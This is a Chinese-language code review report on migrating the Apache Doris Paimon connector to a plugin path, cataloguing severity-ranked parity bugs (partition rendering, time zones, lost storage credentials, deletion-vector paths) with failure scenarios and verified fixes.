# P5 paimon 全功能路径 clean-room 对抗 review — findings (2026-06-11)

## Executive Summary

本次 clean-room 对抗 review 覆盖 paimon connector 迁移的 13 条主审路径 + 5 个补充审查领域。每个 BLOCKER/MAJOR finding 经过 3-lens 对抗验证(new-code-correctness / legacy-parity / reproducibility),另含一个 completeness critic 评估。

### Findings 按严重度统计

| 严重度 | 数量 |
|---|---|
| BLOCKER | 6 |
| MAJOR | 8 |
| MINOR | 18 |
| NIT | 3 |

(主审 13 路 + 补充 5 领域合计:BLOCKER 6、MAJOR 8、MINOR 18、NIT 3,共 35 findings。此表由 workflow 结构化原始数据精确统计;synthesis agent 初稿漏计补充审查的 BLOCKER/MAJOR(原写 5/6/13),编排者已据 raw findings 校正。)

### Verify 阶段裁决(BLOCKER/MAJOR,3-lens)

共有 14 个 BLOCKER/MAJOR finding 进入对抗验证(主审 9 + 补充 5)。结果:**11 CONFIRMED、3 PARTIAL-heavy、0 DOWNGRADED**(无一被多数 lens 驳回)。

- **CONFIRMED(三裁全确认,真实缺陷)**:11 个
  1. [P1] Native-reader DATE/TIMESTAMP_LTZ 分区值裸 toString — BLOCKER(3/0/0 CONFIRMED)
  2. [P3] FOR TIME AS OF 在 CST/PST/EST session 下失败 — MAJOR(3/0/0 CONFIRMED)
  3. [P8] REST vended credentials 不下发 BE — BLOCKER(3/0/0 CONFIRMED)
  4. [P8] HMS hive.conf.resources 静默丢弃 — MAJOR(3/0/0 CONFIRMED)
  5. [P9] s3/oss 凭据从 Paimon FileIO 丢失 — BLOCKER(3/0/0 CONFIRMED)
  6. [P9] DLF gate 通过但无 OSS 凭据 — BLOCKER(3/0/0 CONFIRMED)
  7. [P10] Read 路径传播 paimon NOT NULL — MAJOR(3/0/0 CONFIRMED)
  8. [补充] getTableStatistics 缺 override,行数恒为 -1 — MAJOR(3/0/0 CONFIRMED)
  9. [补充] enable_paimon_cpp_reader 被忽略,Java 序列化破坏 BE cpp deserialize — BLOCKER(3/0/0 CONFIRMED)
  10. [补充] BINARY/VARBINARY 分区列裸 Java array identity 渲染 — MAJOR(3/0/0 CONFIRMED)
  11. [补充] native 渲染修复须移植整个 serializePartitionValue switch(含 session timeZone),非仅 DATE+TIMESTAMP_LTZ — MAJOR(3/0/0 CONFIRMED)

- **PARTIAL(三裁全 PARTIAL,真分歧但影响/场景被夸大,未降级但需注意)**:1 个
  - [P7] Native-path DV 文件路径未归一化 — BLOCKER(0/0/3 PARTIAL):真实存在归一化缺失,但主文件路径同样未归一化,故失败模式应为"主文件读取响亮报错"而非 finding 所述"DV 静默丢弃、已删行复现"。

- **DOWNGRADED(多数 lens 被驳回)**:0 个
  - 注:没有任何 BLOCKER/MAJOR finding 被多数驳回(majorityRefuted)。但有 1 个 MAJOR 在三裁中得到 1 CONFIRMED / 2 PARTIAL(见下),严格意义未达 majorityRefuted,但其失败场景已被多数 lens 质疑。

- **混合(1 CONFIRMED + 2 PARTIAL,真分歧但默认配置下不成立)**:1 个
  - [P8] Paimon JDBC driver_url 绕过安全 allow-list — MAJOR(1/0/2 PARTIAL):分歧真实存在(连接器确实丢失 allow-list 强制 + URL 格式校验),但默认配置下 legacy 也加载任意 jar,只有在管理员加固配置(非默认 jdbc_driver_secure_path / 非空 white_list)时才构成可利用绕过。

### 补充审查中的重定性说明(编排者按原始裁决校正)

- [补充] Native ORC/Parquet read: path_partition_keys 未发出 — completeness critic 假设为 BLOCKER(BE 把分区列当文件列 → 错行),但该领域专项 review 经 BE 代码追踪后自评为 **MINOR**:BE 在 table-format reader 路径从 columns_from_path_keys(新代码确实发出)独立重建分区列,与 slot category / num_of_columns_from_file 无关,未能构造错行场景。仅 FE 侧 parity 分歧 + 潜在脆弱性。
- [补充] Native-path 分区渲染范围扩展 — **三个子 finding 的裁决并不一致**(synthesis 初稿误并为"均 PARTIAL",编排者据 raw verdict 校正):
  - **TIME_WITHOUT_TIME_ZONE 裸 micros/millis 整数渲染 — MAJOR,0/0/3 PARTIAL**:legacy 在 TIME 上本身就崩(`(Long)` cast 抛 CCE),且两侧都把 TIME 映射为 UNSUPPORTED 致投影/谓词不可达,故"legacy 正确、新代码错"的对比不成立——真实渲染分歧但场景被夸大。
  - **BINARY/VARBINARY 裸 Java array identity 渲染 — MAJOR,3/0/0 CONFIRMED**:三裁确认为真实缺陷(legacy 跳过该类型、不发 columnsFromPath;新代码发出 `[B@hash` 垃圾)。
  - **修复范围 — MAJOR,3/0/0 CONFIRMED**:三裁确认 native 渲染修复须移植整个 serializePartitionValue switch(含 session timeZone),非仅 Finding 1.1 的 DATE+TIMESTAMP_LTZ。

### 单一最高优先级真实缺陷

**[P9] s3/oss 凭据从 Paimon FileIO 丢失(BLOCKER,3/0/0 CONFIRMED)** 与并列同级的 **[P8] REST vended credentials 不下发**、**[P9] DLF gate 通过但无 OSS 凭据**、**[P1] native-reader DATE 分区值裸 toString** 共同构成最高优先级的真实数据/可用性缺陷。其中 **s3/oss 凭据丢失**影响面最广:`applyStorageConfig` 只识别 `paimon.s3.`/`paimon.s3a.`/`paimon.fs.s3.`/`paimon.fs.oss.` 四个前缀,而 Doris 官方文档/regression 用例(test_paimon_s3.groovy)使用的规范键 `s3.access_key`/`s3.secret_key`/`s3.endpoint` 被静默丢弃,导致 filesystem flavor + 私有 S3/OSS 桶的 paimon catalog 在 live cutover 路径上零凭据、读取失败。

---

## Per-path Findings

### 路径 1. 基础读取 (normal scan)

覆盖说明:normal-scan 路径两侧端到端追踪。谓词下推(EQ/NE/LT/LE/GT/GE/IN/NOT IN/IS [NOT] NULL/LIKE-prefix)、FLOAT-drop quirk、CHAR-drop、TIMESTAMP-without-tz 固定 UTC、LTZ-no-push、forceJni gate(binlog/audit_log)、empty-pin scan-all guard、supportsCastPredicatePushdown=false 均与 legacy 语义一致。JNI serialized-table/predicate 路径匹配。

#### Finding 1.1 — Native-reader DATE / TIMESTAMP_WITH_LOCAL_TIME_ZONE 分区列值裸 Object.toString() 渲染 → native ORC/Parquet 分区表扫描的列值错误(数据损坏)

- **Severity**: BLOCKER
- **New**: `fe/fe-connector/fe-connector-paimon/src/main/java/org/apache/doris/connector/paimon/PaimonScanPlanProvider.java:383-400`(getPartitionInfoMap;缺陷在 :396 `String value = values[i] != null ? values[i].toString() : null;`)
- **Legacy**: `fe/fe-core/src/main/java/org/apache/doris/datasource/paimon/PaimonUtil.java:545-629`(getPartitionInfoMap + serializePartitionValue),消费于 `source/PaimonScanNode.java:457`(setPaimonPartitionValues on native splits)和 :313-333(columnsFromPath)
- **Difference**: paimon 分区列不物理存于 ORC/Parquet 原始文件;native reader 由 BE 从 columnsFromPath 物化(PaimonScanRange.populateRangeParams:213-226)。Legacy serializePartitionValue 按类型渲染:DATE = `LocalDate.ofEpochDay(Integer).format(ISO_LOCAL_DATE)` → "2024-01-01";TIMESTAMP_WITHOUT_TZ = `Timestamp.toLocalDateTime().format(ISO_LOCAL_DATE_TIME)`;TIMESTAMP_WITH_LOCAL_TIME_ZONE = UTC→session-TZ 转换的 ISO datetime;FLOAT/DOUBLE 经 Float/Double.toString。新代码对 `RowDataToObjectArrayConverter.convert(partition).get(i)` 直接 `.toString()`,无类型处理。DATE 产出 boxed Integer(epoch-days),故渲染为 "19723" 而非 "2024-01-01";TIMESTAMP_WITH_LOCAL_TIME_ZONE 渲染原始 UTC 墙钟(无 session-TZ shift)。(TIMESTAMP_WITHOUT_TZ 恰好匹配,因 `Timestamp.toString()==toLocalDateTime().toString()==ISO_LOCAL_DATE_TIME`。)次要:map key 用原始 paimon 分区键(`partitionKeys.get(i)`)而 legacy 用 Locale.ROOT 小写;不支持类型(如 binary)legacy 返回 null(跳过 columnsFromPath)而新代码发出 `[B@hash` 垃圾。
- **failureScenario**: CREATE 一个 DATE 列分区的 paimon 表,数据文件为 ORC/Parquet(native-reader eligible:非 binlog/audit_log,forceJni=false,全部 .orc/.parquet)。`SELECT date_part_col FROM t`(或任意谓词)。native reader 对每行从 columnsFromPath = "19723"(epoch days)填充 → 每个分区每行显示垃圾/错误日期(或解析错误),而 legacy 返回正确的 "2024-01-01"。非 UTC session 下 TIMESTAMP_WITH_LOCAL_TIME_ZONE 分区列同类错误。
- **suggestion**: 将 legacy serializePartitionValue 移植入 connector(只需 paimon DataType + session TimeZone,均已可得):DATE 经 LocalDate.ofEpochDay,TIMESTAMP_WITHOUT_TZ 经 toLocalDateTime().format,TIMESTAMP_WITH_LOCAL_TIME_ZONE 经 UTC→session-TZ,FLOAT/DOUBLE 经 Float/Double.toString;map key 用 Locale.ROOT 小写;不支持类型返回空 map(legacy 返回 null → 无 columnsFromPath)而非 Object.toString()。
- **Verify 裁决**: **CONFIRMED 3 / REFUTED 0 / PARTIAL 0**。new-code-correctness 端到端确认 DATE Integer epoch-day → "19723";legacy-parity 确认;reproducibility 经 BE partition_column_filler.h text-serde 解析路径 + native 默认 gate(force_jni_scanner 默认 false)确认可达。三裁均判 DATE 案为 BLOCKER 合理。

#### Finding 1.2 — COUNT(*) pushdown(merged-row-count / tableLevelRowCount)被静默丢弃

- **Severity**: MINOR
- **New**: `PaimonScanPlanProvider.java:148-255`(planScan 从不检查 COUNT agg / DataSplit.mergedRowCount() / 设置 paimon.row_count;PaimonScanRange.populateRangeParams:203-208 始终 tableLevelRowCount=-1)
- **Legacy**: `source/PaimonScanNode.java:396-495`(applyCountPushdown / dataSplit.mergedRowCountAvailable() / setPushDownCount / assignCountToSplits)
- **Difference**: legacy 检测 `getPushDownAggNoGroupingOp()==COUNT` 并在 DataSplit 暴露 merged row count 时发出 count-only splits(携 tableLevelRowCount),使 BE 免扫描返回计数。新 connector 完全无 count-pushdown 路径(类 Javadoc 列了 "COUNT pushdown" 为支持路径但无实现)。结果仍正确(全扫描 + BE 聚合),仅更慢;tableLevelRowCount 恒为 -1 故无 count 损坏。
- **failureScenario**: `SELECT COUNT(*) FROM paimon_table` 全数据扫描而非返回预计算 merged row counts → 大表性能回退(无错误结果)。
- **suggestion**: 若需 count-pushdown parity,经 SPI 暴露 agg-pushdown 信号并重实现 merged-row-count split 发出;否则更新类 Javadoc 移除 COUNT-pushdown 声明。

#### Finding 1.3 — Native-reader 不对大原始文件做 sub-split(每文件单 scan range),native ranges 省略 selfSplitWeight

- **Severity**: MINOR
- **New**: `PaimonScanPlanProvider.java:220-245`(每 RawFile 一个 PaimonScanRange:start=0,length=file.length();native Builder 不设 selfSplitWeight)
- **Legacy**: `source/PaimonScanNode.java:434-469`(determineTargetFileSplitSize + fileSplitter.splitFile 产生多个 start/length ranges)
- **Difference**: legacy 按 file_split_size / max_initial_split_size / batch-mode 逻辑将每个 native 原始文件切成多个 Doris splits,启用文件内读并行 + 携 per-split weight。新代码每原始文件发出恰一个 [0, file.length()) range 且无 weight。对 paimon offset()==0 的文件(常态),读字节相同 → 结果正确;仅并行/调度降低。
- **failureScenario**: 对少量超大 ORC/Parquet 原始文件 `SELECT` → 每文件一个 scan range 而非多个 → 扫描并发降低 + split 分配倾斜(无错误结果)。
- **suggestion**: 在 fe-core PluginDrivenScanNode 层经共享 FileSplitter 路由 native splitting,或让 connector 用 session file-split-size 发出多个 sub-ranges 并设 selfSplitWeight。

---

### 路径 2. 批式增量读取 (@incr)

覆盖说明:@incr 端到端两侧追踪。PaimonIncrementalScanParams.validate 经 normalized diff 验证为 legacy validateIncrementalReadParams 的 byte-identical 移植(所有规则、数值边界、closed scanMode enum、case-insensitive-validate/original-case-emit gotcha、only-start-snapshot 拒绝 vs only-start-timestamp Long.MAX_VALUE open-end、empty-params 拒绝、每条错误消息字符串全部一致;唯一变更为 UserException → DorisConnectorException + 行包裹)。两处潜在回退经字节码证据证伪:(1) 剥离的 null reset 键经 AbstractFileStoreTable.copyInternal 反汇编证明在新载 base 表上为 no-op(byte-parity);(2) 发往 BE 的序列化表携 incremental-between* 但经 IncrementalDiffReadProvider.match 反汇编证明 BE read-provider 选择基于 split.beforeFiles()/isStreaming() 而非 table option,故该额外选项 read 时惰性。与 time-travel 互斥保留。

**Findings**: 无。

---

### 路径 3. Time Travel (AS OF)

#### Finding 3.1 — FOR TIME AS OF datetime-string 在 session time_zone CST/PST/EST 下失败,legacy 成功

- **Severity**: MAJOR
- **New**: `fe/fe-connector/fe-connector-paimon/src/main/java/org/apache/doris/connector/paimon/PaimonConnectorMetadata.java:538-547`
- **Legacy**: `fe/fe-core/src/main/java/org/apache/doris/datasource/paimon/PaimonUtil.java:660` 和 `fe/fe-core/src/main/java/org/apache/doris/common/util/TimeUtils.java:138`
- **Difference**: connector 经 `ZoneId.of(session.getTimeZone())` 无 alias map 解析非数字 FOR TIME AS OF 字面量,DateTimeException 即响亮失败。Legacy 经 `ZoneId.of(timezone, TimeUtils.timeZoneAliasMap)` 解析同一 session-zone 字符串,其中 CST 和 PRC 映射到 Asia/Shanghai、UTC 和 GMT 映射到 UTC。`ZoneId.of` 恰好拒绝 CST、PST、EST 而 PRC、UTC、GMT 及数字 offset 可解析。时区字符串两侧来源相同,唯一变更是丢弃 alias 解析。CST 是 Doris 默认 region Asia/Shanghai 的 alias,也是合法 SET time_zone 值。
- **failureScenario**: `SET time_zone = CST` 后 `SELECT ... FOR TIME AS OF` 一个 datetime 字面量。Legacy 解析 CST 为 Asia/Shanghai 并返回 at-or-before snapshot 行。新路径抛 DorisConnectorException 说 CST 非标准 zone id,查询失败。PST、EST 同。
- **suggestion**: ZoneId.of 前内联映射 closed Doris alias 集:CST 和 PRC → Asia/Shanghai,UTC 和 GMT → UTC。这是 timeZoneAliasMap 仅有的四个条目,小内联常量即可保 no-fe-core-import 规则并恢复 legacy parity,同时仍对真正未知 id 响亮失败。
- **Verify 裁决**: **CONFIRMED 3 / REFUTED 0 / PARTIAL 0**。三裁均经 JDK harness 实测确认 `ZoneId.of("CST"/"PST"/"EST")` 抛 ZoneRulesException 而带 alias map 可解析;`SET time_zone = CST` 经 checkTimeZoneValidAndStandardize 原样存 "CST";session zone 两侧来源一致(ctx.getSessionVariable().getTimeZone());paimon 在 SPI_READY_TYPES,cutover live。注:代码注释承认这是 deliberate fail-loud KNOWN LIMITATION,但不否认 legacy parity 丢失。

---

### 路径 4. Branch / Tag 读取

覆盖说明:branch/tag/snapshot 读取两侧端到端追踪。两侧匹配:branch-as-distinct-table-identity、3-arg branch Identifier 加载、tag 钉 NAME 非 id、snapshot-id/timestamp 钉 scan.snapshot-id、all-digit FOR VERSION AS OF 当 snapshot id、scan params + table snapshot 互斥、branch 无 in-branch time travel、empty-branch 处理(benign -1 vs 0L schemaId)。not-found 契约故意不同(legacy 在 PaimonUtil 抛 UserException;新返回 Optional.empty 且 fe-core 消费方重抛相同消息,TIMESTAMP 消息文本简化—documented)。

#### Finding 4.1 — Branch schema 在 schema-history 分歧下解析对 branch 表(新)vs BASE 表(legacy)

- **Severity**: MINOR
- **New**: `PaimonConnectorMetadata.java:484-498` 和 :180-197(schemaAt on the branch table)
- **Legacy**: `PaimonExternalTable.java:159-170`(branch schemaId = schemaManager().latest().id orElse 0L)+ initSchema:342-343(对 getBasePaimonTable() 解析 schemaId)
- **Difference**: 新代码从 BRANCH 最新 snapshot 盖 schemaId(snapshotSchemaId(branchTable, latestSnapshotId))并经 schemaAt(branchTable, schemaId) 对 BRANCH 表 schemaManager 解析。Legacy 盖 schemaId = branch dataTable.schemaManager().latest().id()(最新 SCHEMA 版本,若无新 snapshot 注册了新 schema 则可能比最新 snapshot 的 schemaId 更新),然后 initSchema 对 getBasePaimonTable()(BASE 表 schemaManager)解析。两个独立分歧:(a) latest-schema-id vs latest-snapshot's-schema-id;(b) base-table vs branch-table schemaManager。
- **failureScenario**: schema 历史已与 base 分歧的 branch(如 base {0,1,2},branch {0,3})且最新 snapshot 写于比 schemaManager().latest() 旧的 schema:`@branch('b') SELECT` 可能在两实现间渲染略不同的列集/顺序。实践中是 corner case(branch 通常每新 schema 写新 snapshot 使二 schemaId 相等),不太会浮现;新行为(对 branch 表解析)arguably 更正确。
- **suggestion**: 正确性无需改动 — 新的自洽 branch-table 解析优于 legacy 跨表查找。若需严格 byte-parity 则 document 为 intentional improvement;否则保持。建议在 parity matrix 加一行注释以免误判为回退。

---

### 路径 5. 系统表查询 ($snapshots/$schemas/$partitions...)

覆盖说明:系统表路径两侧追踪,验证 forceJni 路由、TTableType 选择、fail-loud guards、sys-handle identity、enumeration、auth、MVCC 禁用、schema-cache 解析的 parity。forceJni for binlog/audit_log 正确;TTableType 为 HIVE_TABLE;sys-handle identity 正确;MVCC/time-travel 对 sys handle 短路;auth parity。

#### Finding 5.1 — Sys-table fetchRowCount 返回 UNKNOWN -1 而非真实行数

- **Severity**: MINOR
- **New**: `fe/fe-core/src/main/java/org/apache/doris/datasource/PluginDrivenExternalTable.java:436`
- **Legacy**: `fe/fe-core/src/main/java/org/apache/doris/datasource/paimon/PaimonSysExternalTable.java:200`
- **Difference**: legacy 规划 sys 表并汇总 split 行数;新路径继承 fetchRowCount 调 getTableStatistics,PaimonConnectorMetadata 未实现故对所有 paimon 表(含 sys 表)返回 -1。
- **failureScenario**: SHOW TABLE STATUS 和 information_schema.tables 对 t-$snapshots 报 -1 而 legacy 报真实计数。仅统计,与普通表共享,无错行或崩溃。
- **suggestion**: 在 PaimonConnectorMetadata 实现 getTableStatistics,或 document stats-only 分歧。

#### Finding 5.2 — getSupportedSysTables 做冗余 connector handle 往返 vs legacy static map

- **Severity**: MINOR
- **New**: `PluginDrivenExternalTable.java:392`
- **Legacy**: `PaimonExternalTable.java:392`
- **Difference**: legacy 无条件返回 static supported-sys-tables map;新路径先调 resolveConnectorTableHandle(远程 getTableHandle),handle 缺失则返回 empty,尽管 listSupportedSysTables 忽略 handle 始终返回 SDK list。
- **failureScenario**: 规划时短暂 base-handle 失败清空 sys-table 集,使 findSysTable 返回 empty,sys 查询作为 generic table-not-found 失败。影响有限 + 每次 sys-table 规划多一次远程调用。
- **suggestion**: 去掉 getTableHandle 探测直接列名,或 guard 使短暂失败不静默清空。

#### Finding 5.3 — Fail-loud sys-table guard 消息文本从 Paimon 改为 Plugin

- **Severity**: NIT
- **New**: `PluginDrivenScanNode.java:506`
- **Legacy**: `source/PaimonScanNode.java:883`
- **Difference**: 新消息说 Plugin system tables 不支持 scan params 和 time travel;legacy 说 Paimon。条件、顺序、对 getSplits/startSplit 的覆盖相同。
- **failureScenario**: 对 t-$binlog 的 time-travel/scan-params 仍响亮失败,语义相同;仅名词不同。cosmetic。
- **suggestion**: 无需动作;可选恢复 connector 名词以求精确 parity。

---

### 路径 6. 元数据缓存

覆盖说明:metadata-caching 路径两侧追踪。REFRESH CATALOG 和 REFRESH TABLE 失效正确到达新 schema cache:plugin-driven paimon catalog 是 PluginDrivenExternalCatalog,经 ExternalMetaCacheRouteResolver 路由到 ENGINE_DEFAULT(正是 PluginDrivenExternalTable schema 缓存所在,getMetaCacheEngine()=="default")。被丢弃的 legacy FE 缓存(table handle、latest-snapshot memoization、schemaId-keyed 二级 schema cache)是粒度/性能降低,使新路径更新鲜而非更陈旧 — 无 refresh-staleness 回退。

#### Finding 6.1 — 查询内 schema/partition snapshot 不再原子:schema evolution 下缓存的 latest schema 可与 live re-listed partition/snapshot view 分歧

- **Severity**: MINOR
- **New**: `PluginDrivenMvccExternalTable.java:348-362`(getSchemaCacheValue/getLatestSchemaCacheValue)vs :117-142(materializeLatest)和 `PaimonConnectorMetadata.java:336-345`(beginQuerySnapshot)
- **Legacy**: `metacache/paimon/PaimonLatestSnapshotProjectionLoader.java:55-82` + `PaimonTableCacheValue.java:32-44`
- **Difference**: legacy 从一个 memoized PaimonSnapshotCacheValue 派生 latest schema 和 latest partition/snapshot view:resolveLatestSnapshot() 一次读 latestSnapshot(),取其 schemaId,按该 schemaId 载 schema,从同一 table copy 建 partition info — schema 版本与 partition view 是单一一致投影。新代码拆为两个独立读 + 两个 freshness 模型:latest schema 来自 FE 'default' schema cache(仅 nameMapping keyed,TTL/auto-refresh,可能旧版本),partition/MVCC view 来自 live per-query materializeLatest()/beginQuerySnapshot()。schemaId 不再是 cache key 一部分,故 schema-evolved 表可在 TTL 窗口内供旧 schema 而 partition list 反映新 snapshot。
- **failureScenario**: 分区 paimon 表上跑查询,然后 schema evolve(如 ADD COLUMN)并 externally 加分区(不 REFRESH)。TTL 窗口内 getPartitionColumns()/getFullSchema() 可反映 pre-evolution 列集(stale cached schema)而 getNameToPartitionItems()/MTMVSnapshotIdSnapshot 反映 post-evolution snapshot/partition list。最坏可观察为规划中短暂的列数/分区列不匹配,REFRESH TABLE 或 TTL 过期自愈。(REFRESH TABLE/CATALOG 完全修复 — 失效未丢。)
- **suggestion**: 若需严格 legacy 查询内原子 parity,从 materializeLatest 用的同一 connector snapshot 派生 latest schema(经 beginQuerySnapshot 的 schemaId 在同一往返解析,或对 latest 路径也将 schema 钉入 PluginDrivenMvccSnapshot)使 schema 与 partition view 共享单一时间点;否则 document 为 accepted benign reduction(MINOR)。

---

### 路径 7. Deletion Vector 读取

覆盖说明:两侧 DV-read 流端到端追踪。DV split 规划相同(两侧默认 newScan(),均不用 dropDelete),故 DV 文件发出相同;分歧纯在 native 路径的 DV-file 路径传播。Legacy 在交给 BE 前经 LocationPath.of(deletionFile.path(), storagePropertiesMap).toStorageLocation() 归一化 DV URI(将 oss://, cos://, s3a://, https://s3... 重写为 BE reader 需要的 s3://bucket/key)。

#### Finding 7.1 — Native-path deletion-vector 文件路径发往 BE 未归一化 — DV 在 oss:// / cos:// / s3a:// 及 HTTP-style S3 端点上静默丢弃(已删行复现)

- **Severity**: BLOCKER
- **New**: `PaimonScanPlanProvider.java:240-241`(raw df.path());`PaimonScanRange.java:190-200`(setPath of raw string)
- **Legacy**: `source/PaimonScanNode.java:295-298`
- **Difference**: legacy 在交给 BE 前归一化 DV 文件 URI(LocationPath.of(deletionFile.path(), storagePropertiesMap).toStorageLocation(),含注释 'convert the deletion file uri to make sure FileReader can read it in be')。这重写 scheme/authority(S3PropertyUtils.validateAndNormalizeUri 将 oss://bucket/key, cos://..., s3a://..., https://s3.<region>.amazonaws.com/bucket/key 转为 s3://bucket/key)。新路径将 df.path() 原样存入 paimon.deletion_file.path 并直写 TPaimonDeletionFileDesc.setPath,无归一化。connector(不能 import fe-core/LocationPath)和 generic bridge(PluginDrivenScanNode.setScanParams 仅委托 populateRangeParams;PluginDrivenSplit.buildPath 用 NON-normalizing 单参 LocationPath.of)都不恢复。
- **failureScenario**: DV 启用、存于 Aliyun OSS(或 Tencent COS,或任何 Paimon 报 oss:///cos:///s3a:// 或 HTTP-style S3 端点 URI 的 catalog)的 paimon 表。跑走 native ORC/Parquet 路径的普通 SELECT。BE 收到其 S3 FileReader 无法打开的 DV 路径(legacy 会发 s3://...)。DV 载入失败,故其标记删除的行不被过滤 → 已删行复现(静默错误结果)。
- **suggestion**: 在路径离开 FE 前归一化为 BE 期望形式。因 connector 不能 import LocationPath:(a) 在 fe-core bridge 内归一化(PluginDrivenScanNode.setScanParams / PaimonScanRange BE-bound desc 经 LocationPath.of(path, storagePropertiesMap).toStorageLocation());或 (b) 加 SPI seam 使 bridge 经 storage-properties map 后处理。同时对 native data-file path 应用同修复(PluginDrivenSplit.buildPath 用 non-normalizing LocationPath.of),legacy 也归一化了(PaimonScanNode.java:443)。
- **Verify 裁决**: **CONFIRMED 0 / REFUTED 0 / PARTIAL 3** ⚠️ *(三裁全 PARTIAL — 真分歧但失败模式被夸大)*。三个 lens 一致认定:核心 URI 归一化缺失真实存在,但 finding 的 DV-specific *静默*数据损坏框架是错的 —— **同样的未归一化也作用于主数据文件路径**(PaimonScanPlanProvider.java:229 `.path(file.path())` raw → PluginDrivenSplit 单参 LocationPath.of verbatim → FileQueryScanNode.java:568 发 raw 给 BE)。在 oss:///cos:///s3a:// 上主文件与 DV 收到相同的未归一化 scheme,故二者不能独立失败:若 BE S3 reader 拒绝该 scheme,主数据文件读取先失败 → 查询响亮报错或返回空,而非 finding 所述"DV 静默丢弃、已删行复现、legacy 返回正确 post-delete 行"。真实回退存在(整个 native S3-family 非 s3:// scheme 读路径),但属更宽的主路径 + DV 未归一化问题,非 DV-specific 静默正确性 bug。**未降级**(BLOCKER 级别的真分歧仍在),但严重度/场景需重定性。

#### Finding 7.2 — VERBOSE EXPLAIN delete-split 计账对 plugin-driven Paimon 丢失(getDeleteFiles 未 override)

- **Severity**: NIT
- **New**: `PluginDrivenScanNode.java:751-765`(无 getDeleteFiles override)
- **Legacy**: `source/PaimonScanNode.java:337-357`
- **Difference**: legacy override getDeleteFiles(TFileRangeDesc) 返回 DV path,供 FileScanNode.getNodeExplainString(:179-181)计算 deleteSplitNum/deleteFilesSet。bridge PluginDrivenScanNode 不 override,故基类返回 Collections.emptyList()。
- **failureScenario**: 携 DV 文件的 paimon 查询的 EXPLAIN VERBOSE 现显 deleteSplitNum=0 并从 per-backend 列表省略 delete 文件,尽管 DV 实际 attached + applied。仅诊断,无结果影响。
- **suggestion**: 在 PluginDrivenScanNode override getDeleteFiles 从 table-format params 读 TPaimonDeletionFileDesc.getPath()(镜像 PaimonScanNode.getDeleteFiles)。

---

### 路径 8. 多元数据服务接入 (HMS/DLF/REST/Filesystem/JDBC)

覆盖说明:两侧端到端追踪。CREATE CATALOG(type=paimon)经 SPI_READY_TYPES 路由(paimon 已 whitelisted → LIVE),per-flavor 选项装配 + 校验在纯 PaimonCatalogFactory。关键结构发现:legacy property/metastore/Paimon* 类在新路径仍 live 但仅被 initPreExecutionAuthenticator 用于 ExecutionAuthenticator 与 storage/vended-credential 机制 — 非 catalog-option/HiveConf 装配(connector 独立重建)。验证 clean:flavor 选择、warehouse-required parity、HMS uri alias、DLF endpoint-from-region 派生 + catalog-id=uid fallback + proxyMode/accessPublic 默认、DLF auth no-op、S3 prefix 归一化、generic paimon.* rekey、REST/JDBC option passthrough。

#### Finding 8.1 — REST vended credentials 从不下发 BE(数据文件不可读)

- **Severity**: BLOCKER
- **Legacy**: `source/PaimonScanNode.java:171-176, 650-651`;`PaimonVendedCredentialsProvider.java:49-67`
- **New**: `PaimonScanPlanProvider.java:306-315`;`PluginDrivenScanNode.java:307-317`
- **Difference**: legacy doInitialize() 调 VendedCredentialsFactory.getStoragePropertiesMapWithVendedCredentials(...),对 REST catalog 经 extractRawVendedCredentials → RESTTokenFileIO.validToken() 取 per-table 临时 OSS/S3 token,经 getLocationProperties() 发 BE。新 SPI 路径 paimon 表经 PluginDrivenScanNode,其 getLocationProperties() 仅转发 PaimonScanPlanProvider.getScanNodeProperties() 产的 'location.*' 键,而该方法仅复制 STATIC catalog-level 属性(hadoop./fs./dfs./hive./s3./cos./oss./obs. 前缀)。connector 和 bridge 中零 vended-credential 提取。legacy PaimonScanNode(唯一消费方)因 paimon 在 SPI_READY_TYPES 从不实例化。
- **failureScenario**: `CREATE CATALOG ... 'type'='paimon','paimon.catalog.type'='rest',...`(无 static oss./s3. 键)对 vend 临时凭据的 REST server。SELECT 任意表:BE 收无有效 OSS/S3 token,文件读失败 access-denied/403,而 legacy 成功。所有 vended-credential REST catalog 数据不可读。
- **suggestion**: 恢复 SPI 读路径的 vended-credentials 下发:让 connector(或 bridge)对 REST 表取 per-table RESTTokenFileIO.validToken() 并暴露为 location.* scan-node 属性;在此之前将 REST 排出 live SPI 路径。
- **Verify 裁决**: **CONFIRMED 3 / REFUTED 0 / PARTIAL 0**。三裁确认 cutover live(paimon 加入 SPI_READY_TYPES)、legacy vended 机制真实取凭据、新路径无等价、native ORC/Parquet 默认路径是 BE 消费方。new-code-correctness 补充一处严重度澄清:JNI 路径不破坏(BE PaimonJniScanner 反序列化 serialized_table,RESTTokenFileIO catalogContext/identifier/path/token 为非 transient,BE 侧自服务凭据),故只有 NATIVE-reader-eligible REST 表丢凭据,非 "any table";但 native 读为常见情形,BLOCKER 成立。

#### Finding 8.2 — HMS hive.conf.resources(外部 hive-site.xml)在 catalog creation 时静默丢弃

- **Severity**: MAJOR
- **Legacy**: `property/metastore/HMSBaseProperties.java:188-197`(loadHiveConfFromFile)消费于 PaimonHMSMetaStoreProperties.buildHiveConfiguration/initializeCatalog(:77-101)
- **New**: `PaimonCatalogFactory.java:363-425`(buildHmsHiveConf)
- **Difference**: legacy 从 CatalogConfigFileUtils.loadHiveConfFromHiveConfDir(hive.conf.resources) 起建 HMS catalog HiveConf,使外部 hive-site.xml 内每个键(custom hive.metastore.*、SASL、kerberos、socket/timeout、ssl)载入用于建 catalog 的 HiveConf。connector buildHmsHiveConf 仅从 raw property map 重建并显式 DEFER 载 hive.conf.resources 文件(仅复制字面 hive.* 属性键 + 固定 auth/timeout 键集)。仍 live 的 legacy PaimonHMSMetaStoreProperties 解析 hive.conf.resources 但仅其 ExecutionAuthenticator 被 SPI 复用,其 HiveConf 丢弃,故文件内容从不达 CatalogFactory.createCatalog。
- **failureScenario**: `CREATE CATALOG ... 'paimon.catalog.type'='hms','hive.conf.resources'='hive-site.xml'`,该文件携带唯一一份(如 hive.metastore.sasl.qop、custom thrift transport、SSL truststore、metastore URI override)。Legacy 连接成功;新路径这些设置缺失于 catalog HiveConf,致连接/握手失败或对 metastore 行为错误。
- **suggestion**: 经 ConnectorContext hook 路由 hive.conf.resources 解析(FE 经 CatalogConfigFileUtils 载文件并将解析后键值传入 connector 属性),或让 bridge 合并 legacy-built HiveConf;至少在支持前拒绝设了 hive.conf.resources 的 hms catalog 使丢弃响亮。
